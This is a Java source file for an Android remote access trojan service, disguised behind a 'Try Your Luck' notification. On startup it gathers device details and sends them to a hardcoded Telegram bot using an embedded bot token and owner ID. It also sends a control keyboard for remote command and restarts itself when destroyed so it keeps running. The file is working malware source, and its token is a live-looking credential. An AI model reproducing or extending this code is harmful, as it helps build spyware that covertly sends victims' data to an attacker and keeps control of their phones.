package com.my.luck.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.my.luck.network.TelegramBot;

public class RatService extends Service {
    private static final String TAG = "RatService";
    private static final int NOTIFY_ID = 1;
    private static final String CHANNEL_ID = "rat_channel";
    
    private static final String BOT_TOKEN = "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs";
    private static final String OWNER_ID = "8681027856";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service started");
        
        createChannel();
        startForeground(NOTIFY_ID, getNotification());
        
        // Send message to Telegram
        new Thread(() -> {
            try {
                Thread.sleep(2000);
                sendDeviceInfo();
            } catch (Exception e) {
                Log.e(TAG, "Error", e);
            }
        }).start();
    }

    private void sendDeviceInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            
            String msg = "🖥️ <b>DEVICE CONNECTED</b>\n";
            msg += "━━━━━━━━━━━━━━━\n";
            msg += "📱 Model: " + Build.MODEL + "\n";
            msg += "🏷️ Brand: " + Build.BRAND + "\n";
            msg += "📡 Android: " + Build.VERSION.RELEASE + "\n";
            msg += "🕐 Time: " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
            
            TelegramBot bot = new TelegramBot(this, BOT_TOKEN, OWNER_ID);
            bot.sendMessage(msg);
            bot.sendKeyboard();
            
            Log.d(TAG, "Sent to Telegram");
        } catch (Exception e) {
            Log.e(TAG, "Error", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "RAT", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Try Your Luck")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_gallery)
                .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        startService(new Intent(this, RatService.class));
    }
}
